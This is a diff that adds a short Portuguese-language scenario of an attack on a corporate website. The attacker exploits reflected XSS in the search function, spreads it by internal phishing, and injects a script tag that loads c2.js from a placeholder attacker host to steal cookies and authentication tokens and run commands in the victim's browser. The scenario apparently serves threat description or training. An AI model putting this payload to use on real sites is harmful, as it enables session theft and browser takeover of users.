@@ -1,0 +1,11 @@
+O atacante identificou um site corporativo vulnerável a injeção de conteúdo (XSS refletido) na funcionalidade de busca. Utilizando essa falha, injetou um payload JavaScript para estabelecer canal de comunicação com servidor externo via WebSocket, simulando um canal de comando e controle.
+
+O script foi injetado com a seguinte carga:
+
+<script src="http://evil.attacker.com/c2.js"></script>
+
+Esse script carregava comandos adicionais e transmitia informações da sessão da vítima, incluindo cookies, tokens de autenticação e interações do navegador.
+
+A carga foi distribuída por phishing interno, com links manipulados redirecionando usuários da empresa para URLs vulneráveis que disparavam o XSS.
+
+O canal WebSocket era criptografado com chaves rotativas e permitia execução de comandos no DOM local da vítima, simulando um mini RAT via navegador. A persistência era mantida enquanto o usuário estivesse com o navegador aberto.
